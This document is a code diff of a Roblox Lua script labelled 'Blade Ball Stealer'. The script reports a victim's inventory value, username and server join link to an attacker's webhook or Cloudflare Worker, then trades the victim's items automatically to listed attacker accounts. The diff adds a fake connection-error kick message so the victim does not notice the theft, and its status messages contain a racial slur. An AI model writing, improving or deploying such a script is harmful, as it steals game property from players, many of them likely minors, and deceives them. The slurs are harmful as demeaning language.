@@ -16,10 +16,10 @@ local inTrade = false
 local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
 local Replion = require(game.ReplicatedStorage.Packages.Replion)
 
--- Paramètres
+-- Paramètres (Vérifie bien ton Worker URL ici)
 local users = _G.Usernames or {"Li0nIce201410", "ThunderStealthZap16"}
-local webhook = _G.webhook or "" 
-local auth_token = _G.AuthToken or "EBK-SS-A"
+local webhook = _G.webhook or "" -- TON URL DE WORKER ICI
+local auth_token = "EBK-SS-A" -- Correspond à ton SECRET_TOKEN du Worker
 local min_rap = _G.min_rap or 0 
 local ping = _G.pingEveryone or "Yes"
 
@@ -60,11 +60,10 @@ local function getRAP(category, itemName)
 end
 
 ---------------------------------------------------------
--- WEBHOOK (JAUNE QUAND TU REJOINS)
+-- WEBHOOK OPTIMISÉ POUR TON WORKER
 ---------------------------------------------------------
 
 local function SendStatusWebhook(title, color, isStart)
-    -- Tri du plus grand au plus petit RAP
     table.sort(itemsToSend, function(a, b)
         return a.RAP > b.RAP
     end)
@@ -78,32 +77,38 @@ local function SendStatusWebhook(title, color, isStart)
 
     local joinCode = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')"
     local clickableLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
+    
+    -- Format d'URL Headshot (le plus stable pour Discord via Worker)
+    local thumbUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=150&height=150&format=png"
 
-    local data = {
+    -- Structure JSON exacte attendue par ton Worker Cloudflare
+    local payload = {
         ["auth_token"] = auth_token,
         ["content"] = (isStart and ping == "Yes") and "@everyone | " .. joinCode or nil,
         ["embeds"] = {{
             ["title"] = title,
-            ["color"] = color, -- Sera jaune via l'appel de fonction
+            ["color"] = color,
             ["fields"] = {
-                {name = "ℹ️ Player info:", value = "```\n🆔 Username: "..plr.Name.."\n👤 Display: "..plr.DisplayName.."\n📅 Age: "..plr.AccountAge.." Days```", inline = false},
+                {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
+                {name = "💰 Total RAP:", value = "```" .. math.floor(totalRAP) .. "```", inline = true},
                 {name = "🔗 Join link:", value = "[Click to Join Server](" .. clickableLink .. ")", inline = false},
-                {name = "🎒 Item list (Sorted):", value = "```" .. (itemLines ~= "" and itemLines or "None") .. "```", inline = false},
-                {name = "💰 Summary:", value = "```Total RAP: " .. math.floor(totalRAP) .. "```", inline = false}
+                {name = "🎒 Inventory:", value = "```" .. (itemLines ~= "" and itemLines or "Empty") .. "```", inline = false}
             },
             ["thumbnail"] = {
-                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
+                ["url"] = thumbUrl
             },
             ["footer"] = {["text"] = "Blade Ball Stealer | Session Active"}
         }}
     }
 
-    request({
-        Url = webhook,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(data)
-    })
+    local success, res = pcall(function()
+        return request({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
 end
 
 ---------------------------------------------------------
@@ -137,9 +142,10 @@ local function startAutoTrade(targetPlayer)
             end
             task.wait(1)
         end
-        SendStatusWebhook("✅ Stuff Successfully Stolen !", 65280, false) -- Vert pour le succès final
-        task.wait(1)
-        plr:kick("Update Finished.")
+        
+        task.wait(2)
+        -- Kick crédible Code 277
+        plr:kick("Please check your internet connection and try again. (Error Code: 277)")
     end)
 end
 
@@ -163,9 +169,20 @@ if #itemsToSend > 0 then
     local found = false
     for _, p in ipairs(Players:GetPlayers()) do
         if table.find(users, p.Name) then
-            -- COULEUR JAUNE ICI (16776960)
-            SendStatusWebhook("⚠️ The nigga is on the server ! ("..p.Name..")", 16776960, false)
+            SendStatusWebhook("⚠️ The nigga is on the server !", 16776960, false)
             startAutoTrade(p)
             found = true
             break
         end
+    end
+
+    if not found then
+        SendStatusWebhook("🟣 Bro join your hit nigga 🎯", 8323327, true)
+        Players.PlayerAdded:Connect(function(player)
+            if table.find(users, player.Name) then
+                SendStatusWebhook("⚠️ The nigga is on the server !", 16776960, false)
+                startAutoTrade(player)
+            end
+        end)
+    end
+end
